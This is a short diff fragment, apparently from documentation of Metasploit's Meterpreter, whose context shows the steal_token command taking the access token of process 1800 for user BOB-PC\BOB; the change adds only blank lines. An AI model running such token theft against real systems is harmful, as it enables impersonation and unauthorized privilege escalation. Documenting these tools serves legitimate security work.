@@ -23,3 +23,5 @@ steal_token $_PID
 meterpreter > steal_token 1800
 Stolen token with username: BOB-PC\BOB
 ```
+
+
